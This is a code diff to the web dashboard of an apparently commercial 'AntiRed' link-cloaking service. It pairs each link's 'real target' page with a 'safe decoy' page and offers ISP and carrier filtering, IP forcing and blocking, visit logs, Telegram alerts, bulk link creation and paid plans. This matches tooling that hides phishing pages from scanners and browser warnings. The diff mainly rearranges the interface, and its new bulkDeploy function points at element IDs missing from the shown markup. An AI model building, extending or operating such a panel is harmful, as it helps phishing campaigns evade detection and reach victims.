@@ -873,8 +873,6 @@
         <div id="userUsername" style="display: none; margin-bottom: 20px; color: var(--text-muted); font-family: var(--font-mono); font-size: 11px; letter-spacing: 0.05em; cursor: pointer;" onclick="showSection('profile')" title="Your login handle"></div>
 
         <div class="nav-item active" onclick="showSection('dashboard')">Dashboard</div>
-        <div class="nav-item" onclick="showSection('links')">AntiRed</div>
-        <div class="nav-item" onclick="showSection('security')">AntiRed Settings</div>
         <div class="nav-item" onclick="showSection('logs')">Visit Logs</div>
         <div class="nav-item" onclick="showSection('telegram')">Telegram Bot</div>
         <div class="nav-item" onclick="showSection('forced-ip')">Force IP</div>
@@ -892,155 +890,156 @@
 
     <div class="main">
         <div id="dashboard-section" class="content-section active">
-            <div class="metric-grid">
-                <div class="metric-card">
-                    <div class="metric-label">UPLINK_STATUS</div>
-                    <div class="metric-value" id="uplinkStatus">ACTIVE</div>
-                </div>
-                <div class="metric-card">
-                    <div class="metric-label">CREDIT_BALANCE</div>
-                    <div class="metric-value">$<span id="walletBalanceMetric">0.00</span></div>
-                </div>
-                <div class="metric-card">
-                    <div class="metric-label">LINK_EXPIRY</div>
-                    <div class="metric-value" id="expiryMetric">N/A</div>
-                </div>
+            <!-- Newsletter Broadcast -->
+            <div id="dashboardNewsletter" class="card" style="display: none; border-color: var(--accent-border); background: var(--accent-bg);">
+                <div style="font-size: 10px; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px;">OPERATOR_BROADCAST</div>
+                <h2 id="dashboardNewsletterTitle" style="margin-top: 0; border-bottom: none; padding-bottom: 0;">--</h2>
+                <pre id="dashboardNewsletterBody" style="font-family: var(--font-mono); background: rgba(0,0,0,0.2); border: 1px solid var(--border); padding: 14px; white-space: pre-wrap; word-wrap: break-word; margin: 10px 0; color: var(--text-primary); font-size: 13px; line-height: 1.6;"></pre>
+                <div id="dashboardNewsletterMeta" style="font-size: 10px; color: var(--text-muted);"></div>
             </div>
 
+            <!-- Link Expiration Alert -->
             <div id="expiryAlert" class="card" style="display:none; border-color: var(--danger);">
                 <h2 style="color: var(--danger);">!! PROTOCOL_EXPIRATION_WARNING !!</h2>
                 <p>Uplink access has expired. Re-authenticate with a plan below to resume operations.</p>
             </div>
 
-            <div class="card" id="pricing-section">
-                <h2>ACCESS_PROTOCOL_PLANS</h2>
-                <div id="renewContainer" style="display: none; background: var(--bg-elevated); padding: 15px; border: 1px solid var(--accent); margin-bottom: 20px;">
-                    <h3 id="renewTitle" style="margin-top: 0; font-size: 14px;">RENEWING: [LINK_NAME]</h3>
-                    <input type="hidden" id="renewSlug">
-                    <div style="display: flex; gap: 20px; align-items: flex-end; flex-wrap: wrap;">
-                        <div class="form-group" style="flex: 1; min-width: 200px; margin-bottom: 0;">
-                            <label>SELECT_RENEWAL_DURATION</label>
-                            <select id="renewDuration">
+            <!-- Renewal Panel -->
+            <div id="renewContainer" class="card" style="display: none; border-color: var(--accent); background: var(--bg-elevated);">
+                <h3 id="renewTitle" style="margin-top: 0; font-size: 14px; color: var(--accent);">RENEWING_UPLINK</h3>
+                <input type="hidden" id="renewSlug">
+                <div style="display: flex; gap: 20px; align-items: flex-end; flex-wrap: wrap;">
+                    <div class="form-group" style="flex: 1; min-width: 200px; margin-bottom: 0;">
+                        <label>SELECT_RENEWAL_DURATION</label>
+                        <select id="renewDuration">
+                            <option value="3days">03_DAYS :: $15.00</option>
+                            <option value="1week">07_DAYS :: $25.00</option>
+                            <option value="2weeks">14_DAYS :: $50.00</option>
+                            <option value="month">30_DAYS :: $80.00</option>
+                        </select>
+                    </div>
+                    <button onclick="executeRenewal()">[ EXECUTE_RENEWAL ]</button>
+                    <button onclick="cancelRenewal()" style="border-color: var(--text-muted); color: var(--text-muted);">[ CANCEL ]</button>
+                </div>
+            </div>
+
+            <!-- Link Manager (Single) -->
+            <div id="manager-container" class="card" style="margin-top: 20px;">
+                <div id="linkManagerHeader" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
+                    <h2 style="margin: 0; border: none; padding: 0;">LINK_MANAGER</h2>
+                    <div id="uplinkStatusBadge" style="font-family: var(--font-mono); font-size: 11px; padding: 4px 10px; border-radius: 4px; background: var(--bg-elevated); border: 1px solid var(--border);">STATUS: <span id="uplinkStatus">IDLE</span></div>
+                </div>
+
+                <div id="linkCreationForm" style="background: var(--bg-elevated); padding: 20px; border: 1px solid var(--border); margin-bottom: 25px;">
+                    <h3 id="formTitle" style="margin-top: 0; font-size: 14px; text-transform: uppercase;">CREATE_NEW_ANTIRED LINK</h3>
+                    <input type="hidden" id="editOldSlug">
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                        <div id="planSelectionGroup" class="form-group">
+                            <label>SELECT_PLAN</label>
+                            <select id="planDuration">
                                 <option value="3days">03_DAYS :: $15.00</option>
                                 <option value="1week">07_DAYS :: $25.00</option>
                                 <option value="2weeks">14_DAYS :: $50.00</option>
                                 <option value="month">30_DAYS :: $80.00</option>
                             </select>
                         </div>
-                        <button onclick="executeRenewal()">[ EXECUTE_RENEWAL ]</button>
-                        <button onclick="cancelRenewal()" style="border-color: var(--text-muted); color: var(--text-muted);">[ CANCEL ]</button>
+                        <div class="form-group" id="nameGroup">
+                            <label>ANTIRED IDENTIFIER</label>
+                            <input type="text" id="newLinkName" placeholder="target name">
+                        </div>
                     </div>
-                </div>
-                <p style="font-size: 12px; color: var(--text-muted);">Select a link below to renew its access or create a new uplink.</p>
-            </div>
-        </div>
 
-        <div id="links-section" class="card content-section">
-            <h2>LINK_MANAGER</h2>
-            <div style="background: var(--bg-elevated); padding: 20px; border: 1px solid var(--border); margin-bottom: 25px;">
-                <h3 id="formTitle" style="margin-top: 0; font-size: 14px; text-transform: uppercase;">CREATE_NEW_ANTIRED LINK</h3>
-                <input type="hidden" id="editOldSlug">
-                
-                <div id="planSelectionGroup" class="form-group">
-                    <label>SELECT_PLAN</label>
-                    <select id="planDuration">
-                        <option value="3days">03_DAYS :: $15.00</option>
-                        <option value="1week">07_DAYS :: $25.00</option>
-                        <option value="2weeks">14_DAYS :: $50.00</option>
-                        <option value="month">30_DAYS :: $80.00</option>
-                    </select>
-                </div>
-                    <div class="form-group" id="nameGroup">
-                        <label>ANTIRED IDENTIFIER</label>
-                        <input type="text" id="newLinkName" placeholder="target name">
-                    </div>
                     <div class="form-group" id="slugGroup">
-                        <label>CUSTOM_LINK</label>
+                        <label>CUSTOM_LINK_SLUG (OPTIONAL)</label>
                         <input type="text" id="newCustomSlug" placeholder="optional-handle">
                     </div>
+
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                        <div class="form-group">
+                            <label>YOUR_PAGE (REAL_TARGET)</label>
+                            <input type="text" id="newRealLink" placeholder="https://real-target.com">
+                        </div>
+                        <div class="form-group">
+                            <label>FAKE_PAGE (SAFE_DECOY)</label>
+                            <input type="text" id="newNonRealLink" placeholder="https://safe-decoy.com">
+                        </div>
+                    </div>
+
+                    <div style="background: var(--bg-base); padding: 15px; border: 1px solid var(--border); margin-bottom: 20px;">
+                        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
+                            <div class="toggle-group">
+                                <label class="switch">
+                                    <input type="checkbox" id="newAntiRed" checked>
+                                    <span class="slider"></span>
+                                </label>
+                                <span>ANTI_RED</span>
+                            </div>
+                            <div class="toggle-group">
+                                <label class="switch">
+                                    <input type="checkbox" id="newIspFilter" checked>
+                                    <span class="slider"></span>
+                                </label>
+                                <span>ISP_FILTER</span>
+                            </div>
+                            <div class="toggle-group">
+                                <label class="switch">
+                                    <input type="checkbox" id="newReallowVisited" checked>
+                                    <span class="slider"></span>
+                                </label>
+                                <span>REALLOW</span>
+                            </div>
+                        </div>
+
+                        <div id="newLinkIspConfig" style="margin-top: 15px;">
+                            <label>ALLOWED_CARRIERS</label>
+                            <div id="newLinkIspList" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; max-height: 120px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); background: var(--bg-surface);">
+                                <!-- ISPs loaded here -->
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; gap: 15px;">
+                        <button id="submitLinkBtn" onclick="createLink()">[ DEPLOY ANTIRED ]</button>
+                        <button id="cancelEditBtn" onclick="cancelEdit()" style="display: none; border-color: var(--text-muted); color: var(--text-muted);">[ ABORT ]</button>
+                    </div>
                 </div>
 
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <!-- Bulk Link Creator -->
+                <div id="bulkLinkSection" style="background: var(--bg-elevated); padding: 20px; border: 1px solid var(--border); margin-bottom: 25px;">
+                    <h3 style="margin-top: 0; font-size: 14px; text-transform: uppercase;">BULK_LINK_CREATOR</h3>
+                    <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 12px;">Paste one link per line. Format: <code>NAME, REAL_URL, SAFE_URL, SLUG(optional)</code>. Max 50 per submission.</p>
+                    
                     <div class="form-group">
-                        <label>YOUR_PAGE</label>
-                        <input type="text" id="newRealLink" placeholder="https://real-target.com">
-                    </div>
-                    <div class="form-group">
-                        <label>FAKE_PAGE</label>
-                        <input type="text" id="newNonRealLink" placeholder="https://safe-decoy.com">
-                    </div>
-                </div>
-
-                <div style="background: var(--bg-base); padding: 15px; border: 1px solid var(--border); margin-bottom: 20px;">
-                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
-                        <div class="toggle-group">
-                            <label class="switch">
-                                <input type="checkbox" id="newAntiRed" checked>
-                                <span class="slider"></span>
-                            </label>
-                            <span>ANTI_RED</span>
-                        </div>
-                        <div class="toggle-group">
-                            <label class="switch">
-                                <input type="checkbox" id="newIspFilter" checked>
-                                <span class="slider"></span>
-                            </label>
-                            <span>ISP_FILTER</span>
-                        </div>
-                        <div class="toggle-group">
-                            <label class="switch">
-                                <input type="checkbox" id="newReallowVisited" checked>
-                                <span class="slider"></span>
-                            </label>
-                            <span>REALLOW</span>
-                        </div>
+                        <label>BULK_DATA_ENTRY</label>
+                        <textarea id="bulkLinkText" rows="6" placeholder="target1, https://real1.com, https://safe1.com, slug1&#10;target2, https://real2.com, https://safe2.com" style="font-family: var(--font-mono); font-size: 12px;"></textarea>
                     </div>
 
-                    <div id="newLinkIspConfig" style="margin-top: 15px;">
-                        <label>ALLOWED_CARRIERS</label>
-                        <div id="newLinkIspList" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; max-height: 120px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); background: var(--bg-surface);">
-                            <!-- ISPs loaded here -->
-                        </div>
+                    <div style="display: flex; gap: 15px; align-items: center;">
+                        <button onclick="createBulkLinks()">[ DEPLOY_BULK_POOL ]</button>
+                        <span id="bulkStatus" style="font-size: 11px; color: var(--text-muted);"></span>
                     </div>
                 </div>
 
-                <div style="display: flex; gap: 15px;">
-                    <button id="submitLinkBtn" onclick="createLink()">[ DEPLOY ANTIRED ]</button>
-                    <button id="cancelEditBtn" onclick="cancelEdit()" style="display: none; border-color: var(--text-muted); color: var(--text-muted);">[ ABORT ]</button>
+                <!-- Active Links Table -->
+                <div class="table-container" id="linksTableContainer">
+                    <table id="linksTable" class="hide-on-mobile">
+                        <thead>
+                            <tr>
+                                <th>NAME</th>
+                                <th>UNIQUE ANTI-RED LINK</th>
+                                <th>TARGETS (REAL / SAFE)</th>
+                                <th>EXPIRY</th>
+                                <th>ACTIONS</th>
+                            </tr>
+                        </thead>
+                        <tbody id="linksTableBody"></tbody>
+                    </table>
                 </div>
-            </div>
-
-            <div id="bulkLinkSection" style="background: var(--bg-elevated); padding: 20px; border: 1px solid var(--border); margin-bottom: 25px;">
-                <h3 style="margin-top: 0; font-size: 14px; text-transform: uppercase;">BULK_LINK_CREATOR</h3>
-                <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 12px;">Paste one link per line. Format: <code>NAME, REAL_URL, SAFE_URL, SLUG(optional)</code>. Max 50 per submission.</p>
-                
-                <div class="form-group">
-                    <label>BULK_DATA_ENTRY</label>
-                    <textarea id="bulkLinkText" rows="6" placeholder="target1, https://real1.com, https://safe1.com, slug1&#10;target2, https://real2.com, https://safe2.com" style="font-family: var(--font-mono); font-size: 12px;"></textarea>
-                </div>
-
-                <div style="display: flex; gap: 15px; align-items: center;">
-                    <button onclick="createBulkLinks()">[ DEPLOY_BULK_POOL ]</button>
-                    <span id="bulkStatus" style="font-size: 11px; color: var(--text-muted);"></span>
-                </div>
-            </div>
-
-            <div class="table-container">
-                <table id="linksTable" class="hide-on-mobile">
-                    <thead>
-                        <tr>
-                            <th>NAME</th>
-                            <th>UNIQUE ANTI-RED LINK</th>
-                            <th>TARGETS (REAL / SAFE)</th>
-                            <th>EXPIRY</th>
-                            <th>ACTIONS</th>
-                        </tr>
-                    </thead>
-                    <tbody id="linksTableBody"></tbody>
-                </table>
             </div>
         </div>
 
+        <!-- Security section kept but hidden from nav -->
         <div id="security-section" class="card content-section">
             <h2>GLOBAL_SECURITY_PROTOCOL</h2>
             <div style="max-width: 600px;">
@@ -1308,6 +1307,24 @@
         let allIsps = [];
         let currentUser = null;
 
+        function toggleLinkManager(forceVisible) {
+            const creationForm = document.getElementById('linkCreationForm');
+            const bulkSection = document.getElementById('bulkLinkSection');
+            const btn = document.getElementById('showCreationFormsBtn');
+            
+            const show = forceVisible === true || (forceVisible === undefined && (creationForm.style.display === 'none' || creationForm.style.display === ''));
+            
+            if (show) {
+                creationForm.style.display = 'block';
+                bulkSection.style.display = 'block';
+                if (btn) btn.style.display = 'none';
+            } else {
+                creationForm.style.display = 'none';
+                bulkSection.style.display = 'none';
+                if (btn) btn.style.display = 'inline-block';
+            }
+        }
+
         async function loadData() {
             try {
                 const ispRes = await fetch('/api/isps');
@@ -1355,22 +1372,47 @@
                     .sort((a, b) => new Date(a.expiryDate) - new Date(b.expiryDate))[0];
                 const expiredLink = links.find(l => l.expiryDate && new Date(l.expiryDate) <= new Date());
 
+                // Visibility logic based on links existence
+                const creationForm = document.getElementById('linkCreationForm');
+                const bulkSection = document.getElementById('bulkLinkSection');
+                const tableContainer = document.getElementById('linksTableContainer');
+
+                if (links.length > 0) {
+                    tableContainer.style.display = 'block';
+                    
+                    // Add a "Deploy New" button if it doesn't exist
+                    if (!document.getElementById('showCreationFormsBtn')) {
+                        const btn = document.createElement('button');
+                        btn.id = 'showCreationFormsBtn';
+                        btn.innerText = '[ + DEPLOY_NEW_UPLINK ]';
+                        btn.style.marginBottom = '20px';
+                        btn.onclick = () => toggleLinkManager();
+                        document.getElementById('manager-container').insertBefore(btn, creationForm);
+                    }
+                    
+                    // Keep existing visibility unless forced
+                    if (creationForm.style.display === 'block') {
+                        toggleLinkManager(true);
+                    } else {
+                        toggleLinkManager(false);
+                    }
+                } else {
+                    toggleLinkManager(true);
+                    tableContainer.style.display = 'none';
+                    if (document.getElementById('showCreationFormsBtn')) {
+                        document.getElementById('showCreationFormsBtn').style.display = 'none';
+                    }
+                }
+
                 if (activeLink) {
-                    const expiry = new Date(activeLink.expiryDate);
-                    expiryMetric.innerText = expiry.toLocaleDateString();
-                    expiryStatus.innerHTML = `SOONEST_ACTIVE :: <span style="color:var(--accent);">${esc(activeLink.name)}</span> // EXPIRES: ${expiry.toLocaleString()}`;
                     expiryAlert.style.display = 'none';
                     uplinkStatus.innerText = 'ONLINE';
                     uplinkStatus.style.color = 'var(--accent)';
                 } else if (expiredLink) {
-                    expiryStatus.innerHTML = `ALL_UPLINKS :: <span style="color:var(--danger);">EXPIRED</span>`;
                     expiryAlert.style.display = 'block';
                     uplinkStatus.innerText = 'OFFLINE';
                     uplinkStatus.style.color = 'var(--danger)';
-                    expiryMetric.innerText = 'EXPIRED';
                 } else {
-                    expiryStatus.innerHTML = `PROTOCOL :: <span style="color:var(--warning);">UNINITIALIZED</span> // NO_UPLINKS_DEPLOYED`;
-                    expiryMetric.innerText = 'PENDING';
                     uplinkStatus.innerText = 'IDLE';
                     uplinkStatus.style.color = 'var(--warning)';
                 }
@@ -1552,7 +1594,8 @@
         }
 
         function editLink(slug, name, real, nonReal, antiRed, ispFilter, mobileIsps, reallowVisited) {
-            showSection('links');
+            showSection('dashboard');
+            toggleLinkManager(true);
             document.getElementById('formTitle').innerText = 'EDIT_UPLINK :: ' + name;
             document.getElementById('editOldSlug').value = slug;
             document.getElementById('newLinkName').value = name;
@@ -1571,7 +1614,7 @@
             document.getElementById('submitLinkBtn').innerText = '[ UPDATE_UPLINK ]';
             document.getElementById('submitLinkBtn').onclick = updateLink;
             document.getElementById('cancelEditBtn').style.display = 'inline-block';
-            document.getElementById('links-section').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('manager-container').scrollIntoView({ behavior: 'smooth' });
         }
 
         function cancelEdit() {
@@ -1593,6 +1636,38 @@
             document.getElementById('submitLinkBtn').innerText = '[ DEPLOY ANTIRED ]';
             document.getElementById('submitLinkBtn').onclick = createLink;
             document.getElementById('cancelEditBtn').style.display = 'none';
+        }
+
+        async function bulkDeploy() {
+            const data = document.getElementById('bulkDataEntry').value.trim();
+            if (!data) return alert('!! ERROR: DATA_ENTRY_EMPTY');
+
+            const btn = document.getElementById('bulkDeployBtn');
+            const originalText = btn.innerText;
+            btn.innerText = '[ PROCESSING_BULK_POOL... ]';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/api/links/bulk', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data })
+                });
+
+                const result = await res.json();
+                if (res.ok) {
+                    alert(`BULK_POOL_DEPLOYED: ${result.count} links created.`);
+                    document.getElementById('bulkDataEntry').value = '';
+                    loadData();
+                } else {
+                    alert('!! ERROR: ' + result.error);
+                }
+            } catch (err) {
+                alert('!! SYSTEM_FAILURE: ' + err.message);
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }
         }
 
         async function createLink() {
@@ -2201,13 +2276,11 @@
             // Highlight the correct nav item
             const items = document.querySelectorAll('.nav-item');
             if (id === 'dashboard') items[0].classList.add('active');
-            else if (id === 'links') items[1].classList.add('active');
-            else if (id === 'security') items[2].classList.add('active');
-            else if (id === 'logs') items[3].classList.add('active');
-            else if (id === 'telegram') items[4].classList.add('active');
-            else if (id === 'forced-ip') items[5].classList.add('active');
-            else if (id === 'block-ip') items[6].classList.add('active');
-            else if (id === 'profile') items[7].classList.add('active');
+            else if (id === 'logs') items[1].classList.add('active');
+            else if (id === 'telegram') items[2].classList.add('active');
+            else if (id === 'forced-ip') items[3].classList.add('active');
+            else if (id === 'block-ip') items[4].classList.add('active');
+            else if (id === 'profile') items[5].classList.add('active');
 
             // Glitch effect on transition
             const main = document.querySelector('.main');
@@ -2215,7 +2288,8 @@
             setTimeout(() => {
                 main.style.filter = 'none';
                 document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
-                document.getElementById(id + '-section').classList.add('active');
+                const section = document.getElementById(id + '-section');
+                if (section) section.classList.add('active');
                 if (id === 'profile') refreshProfileSection();
                 if (id === 'dashboard') fetchAndShowNewsletter();
             }, 50);
@@ -2226,7 +2300,7 @@
             document.getElementById('renewSlug').value = slug;
             document.getElementById('renewTitle').innerText = 'RENEWING_UPLINK :: ' + name.toUpperCase();
             document.getElementById('renewContainer').style.display = 'block';
-            document.getElementById('pricing-section').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('renewContainer').scrollIntoView({ behavior: 'smooth' });
         }
 
         function cancelRenewal() {
@@ -2299,7 +2373,25 @@
                 const res = await fetch('/api/newsletter');
                 if (!res.ok) return;
                 const data = await res.json();
+                
+                // Show in popup
                 openNewsletterPopup(data);
+
+                // Show on dashboard card
+                const title = (data.title || '').trim();
+                const body = (data.body || '').trim();
+                if (title || body) {
+                    const card = document.getElementById('dashboardNewsletter');
+                    document.getElementById('dashboardNewsletterTitle').innerText = title || 'OPERATOR_NOTICE';
+                    document.getElementById('dashboardNewsletterBody').innerText = body || title;
+                    const meta = document.getElementById('dashboardNewsletterMeta');
+                    if (data.updatedAt) {
+                        meta.innerText = 'POSTED :: ' + new Date(data.updatedAt).toLocaleString();
+                    } else {
+                        meta.innerText = '';
+                    }
+                    card.style.display = 'block';
+                }
             } catch (e) {
                 console.warn('Newsletter fetch failed:', e);
             }
